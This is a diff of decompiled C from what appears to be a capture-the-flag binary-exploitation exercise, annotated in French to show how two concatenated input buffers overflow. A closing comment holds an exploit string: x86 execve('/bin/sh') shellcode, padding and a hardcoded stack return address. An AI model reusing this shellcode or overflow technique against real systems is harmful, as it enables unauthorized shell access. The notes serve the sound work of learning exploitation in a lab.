@@ -13,10 +13,14 @@ char *__cdecl pp(char *buffer)
   char intput_1[20]; // [esp+28h] [ebp-30h] BYREF
   char input_2[28]; // [esp+3Ch] [ebp-1Ch] BYREF
 
-  p(intput_1, " - ");
-  p(input_2, " - ");
+  p(intput_1, " - "); //AAAAAAAAAAAAAAAAAAA\0
+  p(input_2, " - "); //B\0
   strcpy(buffer, intput_1); //copy input1 (input 1 + input 2)
-  *(_WORD *)&buffer[strlen(buffer)] = unk_80486A4; //'\0' ? // pose address of char finale de buffer
+  //car input_1 20 char + input_2
+  //AAAAAAAAAAAAAAAAAAAB B
+
+
+  *(_WORD *)&buffer[strlen(buffer)] = " "; //'\0' ? // pose address of char finale de buffer
   return strcat(buffer, input_2);
 }
 
@@ -28,3 +32,6 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   puts(buffer);
   return 0;
 }
+
+// \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0
+// \x0b\xcd\x80AAAAAAAAAAAAA\x4e\xf7\xff\xbf
